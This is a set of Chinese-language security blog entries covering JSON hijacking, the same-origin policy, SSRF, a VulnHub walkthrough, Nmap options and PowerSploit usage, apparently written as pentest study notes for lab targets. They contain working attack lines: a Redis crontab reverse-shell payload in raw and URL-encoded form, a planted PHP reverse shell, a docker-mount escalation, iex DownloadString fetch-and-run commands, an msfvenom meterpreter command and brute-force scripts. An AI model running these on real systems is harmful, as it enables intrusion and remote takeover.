<h2 id="0x03-JSON劫持攻击之钓鱼"><a href="#0x03-JSON劫持攻击之钓鱼" class="headerlink" title="0x03 JSON劫持攻击之钓鱼"></a>0x03 JSON劫持攻击之钓鱼</h2><ol start="4">
<li>把JSON.html发到论坛、贴吧等等，让用户点击，获取用户名替换AAA，就可获取到相关用户的信息。</li>
<li>附安全大佬的截图</li>
<li><img src="/JSON%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB/5.png" alt></li>
</ol>
<h2 id="0x04-JSON劫持漏洞修复"><a href="#0x04-JSON劫持漏洞修复" class="headerlink" title="0x04 JSON劫持漏洞修复"></a>0x04 JSON劫持漏洞修复</h2><ol>
<li>添加Referer白名单</li>
<li>请求头中添加CSRF token并在后端验证</li>
<li>不发送JSON数组的格式</li>
<li>强制使用POST方法访问API</li>
<li>禁用API</li>
</ol>
]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>同源策略</title>
    <url>/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h2 id="0x00-同源策略"><a href="#0x00-同源策略" class="headerlink" title="0x00 同源策略"></a>0x00 同源策略</h2><h2 id="0x01-同源策略"><a href="#0x01-同源策略" class="headerlink" title="0x01 同源策略"></a>0x01 同源策略</h2><ol>
<li><p>同源策略，是由Netscape提出的一个著名的安全策略，是浏览器最核心也最基本的安全功能，所有支持javascript的浏览器都会使用这个策略。</p>
</li>
<li><p>所谓同源：是指不同的两个页面的协议、域名、端口都相同。</p>
</li>
<li><p>原：<a href="http://bbb.aaa.com/home/index.html" target="_blank" rel="noopener">http://bbb.aaa.com/home/index.html</a></p>
</li>
<li><p>同源：<a href="http://bbb.aaa.com/admin/login.html" target="_blank" rel="noopener">http://bbb.aaa.com/admin/login.html</a> #只有路径不同</p>
</li>
<li><p>同源：<a href="http://bbb.aaa.com/home/path/search.html" target="_blank" rel="noopener">http://bbb.aaa.com/home/path/search.html</a> #只有路径不同</p>
</li>
<li><p>不同源：<a href="https://bbb.aaa.com/home/info.html" target="_blank" rel="noopener">https://bbb.aaa.com/home/info.html</a> #不同协议（http、https）</p>
</li>
<li><p>不同源：<a href="http://ccc.aaa.com/home/info.html" target="_blank" rel="noopener">http://ccc.aaa.com/home/info.html</a> #不同域名（bbb.aaa.com、ccc.aaa.com）</p>
</li>
<li><p>不同源：<a href="http://bbb.aaa.com:8080/home/info.html" target="_blank" rel="noopener">http://bbb.aaa.com:8080/home/info.html</a> #不同端口（默认80、8080）</p>
</li>
<li><p>同源策略限制不同源的客户端脚本在未授权的情况下，不能读写对方的资源。</p>
</li>
<li><p>主要分DOM同源策略、XMLHttpRequests同源策略</p>
</li>
</ol>
<h2 id="0x02-跨域"><a href="#0x02-跨域" class="headerlink" title="0x02 跨域"></a>0x02 跨域</h2><ol>
<li><p><strong>DOM同源策略</strong>，主要是iframe跨域</p>
</li>
<li><p>假如一个黑网站，使用iframe嵌套一个用户信任网站（如淘宝、银行等等）</p>
</li>
<li><p>把iframe宽高调到页面全部，这样表面上除了域名不同，其他都一样</p>
</li>
<li><p>这时用户输入账号密码，这样黑网站就可以跨域访问到信任网站的DOM节点，获取用户的账号密码。</p>
</li>
<li></li>
<li><p>正常的百度搜索页面</p>
</li>
<li><p><img src="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/1.png" alt></p>
</li>
<li><p>iframe嵌套显示整个页面</p>
</li>
<li><p><img src="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/2.png" alt></p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html style=&quot;height: 100%&quot;&gt;
 &lt;head&gt;
     &lt;meta charset=&quot;utf-8&quot;&gt;
     &lt;title&gt;iframe baidu&lt;/title&gt;
 &lt;/head&gt;

 &lt;body style=&quot;height: 100%&quot;&gt;
     &lt;iframe src=&quot;https://www.baidu.com&quot; width=&quot;100%&quot; height=&quot;100%&quot; frameborder=0 scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;
 &lt;/body&gt;
&lt;/html&gt;</code></pre></li>
<li><p><strong>XMLHttpRequest同源策略</strong>，攻击者可利用CSRF攻击</p>
</li>
<li><p>用户登录信任网站，信任网站就会在用户的cookie中添加用户标识</p>
</li>
<li><p>同时，用户访问了恶意网站，执行了恶意网站中的AJAX请求代码</p>
</li>
<li><p>恶意网站利用信任网站给用户的用户标识，向信任网站发起AJAX HTTP请求（恶意请求），同浏览器请求时附带用户标识</p>
</li>
<li><p>信任网站获取到请求数据包中的用户标识，就默认是合法用户的正常操作，接着信任网站就响应了恶意请求</p>
</li>
<li><p>或返回用户的敏感信息，或执行了恶意操作（增删改）等等</p>
</li>
<li><p>由于AJAX是在后台执行的，用户无法直接查看到这一过程。</p>
</li>
</ol>
<p><strong>允许跨域访问</strong></p>
<ol>
<li>使用 CORS 允许跨源访问。</li>
</ol>
<p><strong>阻止跨域访问</strong></p>
<ol>
<li>阻止跨域写操作，只要检测请求中的一个不可测的标记(CSRF token)即可，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。必须使用这个标记来阻止页面的跨站读操作。</li>
<li>阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。</li>
<li>阻止跨站嵌入，需要确保你的资源不能是以上列出的可嵌入资源格式。多数情况下浏览器都不会遵守 Content-Type 消息头。例如，如果您在HTML文档中指定 <script> 标记，则浏览器将尝试将HTML解析为JavaScript。 当您的资源不是您网站的入口点时，您还可以使用CSRF令牌来防止嵌入。</li>
</ol>
<h2 id="0x03-JavaScript的同源策略"><a href="#0x03-JavaScript的同源策略" class="headerlink" title="0x03 JavaScript的同源策略"></a>0x03 JavaScript的同源策略</h2><ol>
<li>Json hijacking</li>
</ol>
<h2 id="0x04-XSSI"><a href="#0x04-XSSI" class="headerlink" title="0x04 XSSI"></a>0x04 XSSI</h2><ol>
<li>Cross Site Script Inclusion (XSSI) 跨站脚本包含是一种允许攻击者通过恶意JS绕过边界窃取信息的攻击技术。</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></li>
<li><a href="https://www.cnblogs.com/laixiangran/p/9064769.html" target="_blank" rel="noopener">https://www.cnblogs.com/laixiangran/p/9064769.html</a></li>
</ol>
</script></li></ol>]]></content>
      <tags>
        <tag>知识</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF</title>
    <url>/SSRF/</url>
    <content><![CDATA[<h2 id="0x00-SSRF"><a href="#0x00-SSRF" class="headerlink" title="0x00 SSRF"></a>0x00 SSRF</h2><p>&ensp;&ensp;&ensp;&ensp;SSRF（Server-Side Request Forgery）服务器端请求伪造：一种由外网攻击者构造请求，利用连通内外网的服务器向内网发起请求的安全漏洞。一般情况下，这里分内外网，其实就是两个不能直通的局域网，通过同时连接内外网的主机来实现请求访问。</p>
<h2 id="0x01-SSRF分类"><a href="#0x01-SSRF分类" class="headerlink" title="0x01 SSRF分类"></a>0x01 SSRF分类</h2><ol>
<li>可明确判断的响应</li>
<li>不可明确判断的响应</li>
</ol>
<h2 id="0x02-SSRF常出现的位置"><a href="#0x02-SSRF常出现的位置" class="headerlink" title="0x02 SSRF常出现的位置"></a>0x02 SSRF常出现的位置</h2><ol>
<li>云服务器</li>
<li>远程图片加载（编辑器远程图片加载，头像）</li>
<li>网站采集、网页抓取</li>
<li>url有输入域名或IP的参数</li>
</ol>
<h2 id="0x03-SSRF危害"><a href="#0x03-SSRF危害" class="headerlink" title="0x03 SSRF危害"></a>0x03 SSRF危害</h2><ol>
<li>内部服务器的服务信息与端口信息被搜集</li>
<li>WAF或CDN被绕过</li>
<li>内网中的一些服务或程序被恶意执行（Redis）</li>
<li>绕过目录限制，访问内网web目录的其他目录或文件，本服务器的应用程序被恶意执行或攻击</li>
<li>下载内网文件资源</li>
</ol>
<h2 id="0x04-SSRF例子"><a href="#0x04-SSRF例子" class="headerlink" title="0x04 SSRF例子"></a>0x04 SSRF例子</h2><ol>
<li><strong>weblogic SSRF CVE-2014-4210</strong></li>
<li><strong>靶场例子</strong></li>
<li><img src="/SSRF/4.png" alt></li>
<li>远程文件读取</li>
<li><img src="/SSRF/5.png" alt></li>
<li><img src="/SSRF/6.png" alt></li>
<li>内网端口扫描</li>
<li><img src="/SSRF/7.png" alt></li>
<li><img src="/SSRF/8.png" alt></li>
<li>同理，可以远程执行命令（需要Redis服务，写入到计划任务中，反弹shell）</li>
</ol>
<p><strong>相关代码</strong></p>
<pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;
config set dir /etc/
config set dbfilename crontab
save</code></pre><p><strong>URL编码</strong></p>
<pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Atest</code></pre><h2 id="0x05-SSRF测试工具"><a href="#0x05-SSRF测试工具" class="headerlink" title="0x05 SSRF测试工具"></a>0x05 SSRF测试工具</h2><ol>
<li><strong>curl</strong></li>
<li>curl -v file:///etc/passwd</li>
<li><img src="/SSRF/1.png" alt></li>
<li>curl -v <a href="ftp://192.168.100.19:80/" target="_blank" rel="noopener">ftp://192.168.100.19:80/</a> #端口存活，连接就会等待一段时间</li>
<li><img src="/SSRF/2.png" alt></li>
<li>端口不存活就即刻显示失败，通过错误信息也可以对比出：存活端口显示响应读取失败，不存活端口直接是连接失败</li>
<li><img src="/SSRF/3.png" alt></li>
</ol>
]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>John-the-Ripper</title>
    <url>/John-the-Ripper/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><img src="/John-the-Ripper/1.jfif" alt></p>
<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><ol>
<li></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/" target="_blank" rel="noopener">https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/</a></li>
<li><a href="https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/" target="_blank" rel="noopener">https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/</a></li>
</ol>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之chakravyuh</title>
    <url>/vulnhub%E4%B9%8Bchakravyuh/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><img src="/vulnhub%E4%B9%8Bchakravyuh/1.png" alt></p>
<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><ol>
<li>虚拟机自动获取IP</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/2.png" alt></li>
<li>nmap扫端口</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/3.png" alt> </li>
<li>FTP允许匿名登录，查看目录及文件，下载文件</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/4.png" alt></li>
<li>解压文件，要密码</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/5.png" alt></li>
<li>使用<a href="https://github.com/truongkma/ctf-tools/blob/master/John/run/7z2john.py" target="_blank" rel="noopener">7z2john.py</a>来提取文件的hash值，john来破解hash</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/6.png" alt></li>
<li>得密码为family，解压，得一串字符串</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/7.png" alt></li>
<li>Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E=，像base64字符串，解码一下</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/8.png" alt></li>
<li>gila:<a href="mailto:admin@gmail.com" target="_blank" rel="noopener">admin@gmail.com</a>:princesa，用户名<a href="mailto:admin@gmail.com" target="_blank" rel="noopener">admin@gmail.com</a>，密码princesa，gila并不清楚是啥</li>
<li>当目录访问一下<a href="http://192.168.100.7/gila/，发现可访问" target="_blank" rel="noopener">http://192.168.100.7/gila/，发现可访问</a></li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/9.png" alt></li>
<li>找CMS默认后台，是admin，访问<a href="http://192.168.100.7/gila/admin，登录" target="_blank" rel="noopener">http://192.168.100.7/gila/admin，登录</a></li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/10.png" alt></li>
<li>搜索gila cms漏洞</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/11.png" alt></li>
<li>本地文件包含漏洞，试试包含Linux的/etc/passwd</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/12.png" alt></li>
<li>发现只能包含/gila目录下的文件，点击index.php，在文章下插入<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener">php反弹shell代码</a></li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/13.png" alt></li>
<li>修改反弹到指定IP与端口，开启监听，点击save</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/14.png" alt></li>
<li>反弹shell成功，使用Python获取一个伪终端</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/15.png" alt></li>
<li>提权，前面知道有个docker用户组，使用docker时，所有命令都需要sudo，因为docker需要root才能运行。</li>
<li>docker守护进程的工作方式是允许其访问root用户或docker组的其他任何用户，说明不需要任何密码即可对docker组进行访问。</li>
<li>查看镜像docker images</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/16.png" alt></li>
<li>使用docker -v /root:/mnt -it alpine #-v 绑定挂载目录，宿主机/root，docker镜像中的/mnt，-it 终端交互模式</li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/17.png" alt></li>
<li><img src="/vulnhub%E4%B9%8Bchakravyuh/18.png" alt></li>
<li>未完</li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap</title>
    <url>/Nmap/</url>
    <content><![CDATA[<h2 id="0x00-Nmap"><a href="#0x00-Nmap" class="headerlink" title="0x00 Nmap"></a>0x00 Nmap</h2><p><img src="/Nmap/1.jpg" alt></p>
<h2 id="0x10-扫描目标"><a href="#0x10-扫描目标" class="headerlink" title="0x10 扫描目标"></a>0x10 扫描目标</h2><ol>
<li>nmap ip、domain、ip/24、192.168.0-254.1-254</li>
<li>nmap -iL ips.txt #扫描ip列表</li>
<li>nmap –exclute 192.168.10.1,192.168.10.4 #排除IP</li>
<li>nmap –excludefile ips.txt</li>
</ol>
<h2 id="0x11-主机发现"><a href="#0x11-主机发现" class="headerlink" title="0x11 主机发现"></a>0x11 主机发现</h2><ol>
<li>nmap -sL 192.168.0.1/24 #只是列出主机，不会发送任何报文</li>
<li>nmap -sn IP #ping 扫描</li>
<li>nmap -Pn IP #禁ping扫描，默认主机存活，更深服务扫描</li>
<li>-PS #TCP SYN ping扫描，发送一个设置了SYN标志位的空TCP报文，默认80端口</li>
<li>-PA #TCP ACK ping扫描，发送一个设置了ACK标志位的空TCP报文，如果目标主机运行的话，总是会回应一个RST报文，有的防火墙会拦截SYN报文，而不拦截ACK报文。</li>
<li>-PU #UDP ping扫描，默认31338端口</li>
<li>-PR #ARP ping扫描</li>
<li>-n #不解析域名</li>
<li>-R #解析域名</li>
<li>–system-dns #使用系统域名解析器</li>
<li>–dns-servers #指定自定义DNS服务器</li>
<li>–traceroute #跟踪到每个主机的跃点路径</li>
</ol>
<h2 id="0x12-端口扫描"><a href="#0x12-端口扫描" class="headerlink" title="0x12 端口扫描"></a>0x12 端口扫描</h2><ol>
<li>-sS #TCP SYN</li>
<li>-sT #TCP connect()扫描</li>
<li>-sU #UDP扫描，常见DNS53、SNMP161/162、DHCP67/68</li>
<li>-sN #Null扫描，不设置任何标志位</li>
<li>-sF #FIN扫描，只设置TCP FIN标志位</li>
<li>-sA #TCP ACK扫描</li>
<li>–scanflags #定制TCP扫描</li>
<li>-p8080,-p1-65535,-p U:53,111,T:445 #指定端口</li>
<li>–exclude-ports #排除端口 </li>
<li>-F #快速模式</li>
<li>-r #连续扫描端口，不随机</li>
</ol>
<h2 id="0x13-服务扫描"><a href="#0x13-服务扫描" class="headerlink" title="0x13 服务扫描"></a>0x13 服务扫描</h2><ol>
<li>-sV #扫描开启端口的服务与版本</li>
<li>–version-intensity #版本强度，0-9</li>
<li>–version-light #2</li>
<li>–version-all #9</li>
<li>–version-trace #显示详细的版本扫描活动</li>
</ol>
<h2 id="0x14-系统检测"><a href="#0x14-系统检测" class="headerlink" title="0x14 系统检测"></a>0x14 系统检测</h2><ol>
<li>-O #启用操作系统检测</li>
<li>-A #启用操作系统检测等</li>
</ol>
<h2 id="0x15-其他"><a href="#0x15-其他" class="headerlink" title="0x15 其他"></a>0x15 其他</h2><ol>
<li>-T #时序模板，0-5</li>
<li>–host-timeout #超时</li>
<li>–scan-delay/–max-scan-delay #扫描延迟</li>
<li>-F,–mtu #分段数据包</li>
<li>-D #使用诱饵隐蔽扫描</li>
<li>-S #源地址欺骗</li>
<li>-e #使用指定的接口</li>
<li>-g,–source-port #源端口欺骗</li>
<li>–proxies #代理</li>
<li>–data 16进制字符串 #将自定义payload附加到发送的数据包</li>
<li>–data-string 字符串 #将自定义ASCII字符串附加到发送的数据包</li>
<li>–data-length #将随机数据追加到发送的数据包</li>
</ol>
<h2 id="0x20-脚本扫描"><a href="#0x20-脚本扫描" class="headerlink" title="0x20 脚本扫描"></a>0x20 脚本扫描</h2><ol>
<li>-sC #等于–script=default</li>
<li>–script=&lt;Lua 脚本&gt;</li>
<li>–script=1.nse,2.nse</li>
<li>–script-args=&lt;n1=v1,n2=v2&gt; #脚本参数</li>
<li>–script-args-file=filename</li>
<li>–script-trace #显示所有发送和接收的数据</li>
<li>–script-updatedb #更新脚本数据库</li>
<li>–script-help = &lt;Lua脚本&gt;</li>
</ol>
<h2 id="0x21-常见脚本扫描"><a href="#0x21-常见脚本扫描" class="headerlink" title="0x21 常见脚本扫描"></a>0x21 常见脚本扫描</h2><p><strong>Oracle</strong></p>
<ol>
<li>nmap –script oracle-sid-brute IP</li>
<li>nmap –script -p 1521 –script-args oracle-brute.sid=XE IP</li>
</ol>
<p><strong>Sql Server</strong></p>
<ol>
<li>nmap -p1433 –script ms-sql-info IP #搜集mssql数据库信息</li>
<li>nmap -p1433 –script ms-sql-brute IP #爆破mssql身份验证</li>
<li>nmap -p1433 –script ms-sql-brute –script-args userdb=/tmp/user.txt,passdb=/tmp/pass.txt IP #爆破账号密码</li>
<li>nmap -p1433 –script ms-sql-empty-password IP #验证空密码</li>
<li>nmap -p1433 –script ms-sql-hasdbaccess.nse –script-args mssql.username=sa IP #用户sa，空密码，直连数据库</li>
<li>nmap -p1433 –script ms-sql-tables –script-args mssql.username=sa IP #查询数据表</li>
<li>nmap -p1433 –script ms-sql-xp-cmdshell –script-args=ms-sql-xp-cmdshell.cmd=’whoami’,mssql.username=sa IP #执行操作系统命令</li>
<li><img src="/Nmap/1.png" alt></li>
</ol>
<h2 id="0xF0-Nmap帮助信息"><a href="#0xF0-Nmap帮助信息" class="headerlink" title="0xF0 Nmap帮助信息"></a>0xF0 Nmap帮助信息</h2><pre><code>Nmap 7.80 ( https://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL &lt;inputfilename&gt;: Input from list of hosts/networks
  -iR &lt;num hosts&gt;: Choose random targets
  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks
  --excludefile &lt;exclude_file&gt;: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers
  --system-dns: Use OS&#39;s DNS resolver
  --traceroute: Trace hop path to each host
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags &lt;flags&gt;: Customize TCP scan flags
  -sI &lt;zombie host[:probeport]&gt;: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b &lt;FTP relay host&gt;: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p &lt;port ranges&gt;: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports consecutively - don&#39;t randomize
  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports
  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of
           directories, script-files or script-categories
  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=&lt;Lua scripts&gt;: Show help about scripts.
           &lt;Lua scripts&gt; is a comma-separated list of script-files or
           script-categories.
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  Options which take &lt;time&gt; are in seconds, or append &#39;ms&#39; (milliseconds),
  &#39;s&#39; (seconds), &#39;m&#39; (minutes), or &#39;h&#39; (hours) to the value (e.g. 30m).
  -T&lt;0-5&gt;: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes
  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies
      probe round trip time.
  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.
  --host-timeout &lt;time&gt;: Give up on target after this long
  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes
  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second
  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)
  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys
  -S &lt;IP_Address&gt;: Spoof source address
  -e &lt;iface&gt;: Use specified interface
  -g/--source-port &lt;portnum&gt;: Use given port number
  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies
  --data &lt;hex string&gt;: Append a custom payload to sent packets
  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets
  --data-length &lt;num&gt;: Append random data to sent packets
  --ip-options &lt;options&gt;: Send packets with specified ip options
  --ttl &lt;val&gt;: Set IP time-to-live field
  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:
  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA &lt;basename&gt;: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --append-output: Append to rather than clobber specified output files
  --resume &lt;filename&gt;: Resume an aborted scan
  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir &lt;dirname&gt;: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES</code></pre>]]></content>
      <tags>
        <tag>工具</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>Powershell</title>
    <url>/Powershell/</url>
    <content><![CDATA[<h2 id="0x00-Powershell"><a href="#0x00-Powershell" class="headerlink" title="0x00 Powershell"></a>0x00 Powershell</h2><p><img src="/Powershell/1.png" alt></p>
<h2 id="0x10-常用命令"><a href="#0x10-常用命令" class="headerlink" title="0x10 常用命令"></a>0x10 常用命令</h2><ol>
<li>get-process #获取所有进程</li>
<li>get-help<br>Set-ItemProperty</li>
</ol>
<h2 id="0x20-PowerSploit"><a href="#0x20-PowerSploit" class="headerlink" title="0x20 PowerSploit"></a>0x20 <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a></h2><ul>
<li><a href="https://www.cnblogs.com/yuzly/p/10505365.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/10505365.html</a></li>
<li><a href="https://www.freebuf.com/column/171993.html" target="_blank" rel="noopener">https://www.freebuf.com/column/171993.html</a></li>
</ul>
<ol>
<li>powersploit是Microsoft PowerShell模块的集合，信息搜集、代码执行、脚本执行、持久化、绕过杀毒软件、渗出、混淆、提权等等</li>
<li>python -m http.server 80 #切换到指定目录，开启python简单服务器（python2）</li>
<li><img src="/Powershell/2.png" alt></li>
<li><img src="/Powershell/3.png" alt></li>
</ol>
<h3 id="0x21-AntivirusBypass-防毒软件绕过"><a href="#0x21-AntivirusBypass-防毒软件绕过" class="headerlink" title="0x21 AntivirusBypass 防毒软件绕过"></a>0x21 AntivirusBypass 防毒软件绕过</h3><ol>
<li>iex(New-Object net.webclient).DownloadString(“<a href="http://192.168.100.1:8888/AntivirusBypass/Find-AVSignature.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/AntivirusBypass/Find-AVSignature.ps1&quot;</a>)</li>
<li>get-help Find-AVSignature</li>
<li><img src="/Powershell/4.png" alt></li>
<li>Find-AVSignature -StartByte 0 -EndByte 220000 -Interval 110000 -Path C:\Temp\test.dll -OutPath C:\Temp\test1.dll -Verbose</li>
<li><img src="/Powershell/5.png" alt></li>
<li><a href="https://www.virscan.org/" target="_blank" rel="noopener">virscan</a>验证病毒文件（意思是那意思）</li>
<li>原文件</li>
<li><img src="/Powershell/6.png" alt></li>
<li>文件偏移后</li>
<li><img src="/Powershell/8.png" alt></li>
<li><img src="/Powershell/7.png" alt></li>
</ol>
<h3 id="0x22-CodeExecution-代码执行"><a href="#0x22-CodeExecution-代码执行" class="headerlink" title="0x22 CodeExecution 代码执行"></a>0x22 CodeExecution 代码执行</h3><ol>
<li>iex(New-Object net.webclient).DownloadString(“<a href="http://192.168.100.1:8888/CodeExecution/Invoke-Shellcode.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/CodeExecution/Invoke-Shellcode.ps1&quot;</a>)</li>
<li>get-help Invoke-Shellcode</li>
<li><img src="/Powershell/9.png" alt></li>
<li>get-help Invoke-Shellcode -examples</li>
<li><img src="/Powershell/11.png" alt></li>
<li>使用msfvenom生成powershell脚本</li>
<li>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -f powershell &gt; /root/tmp/test</li>
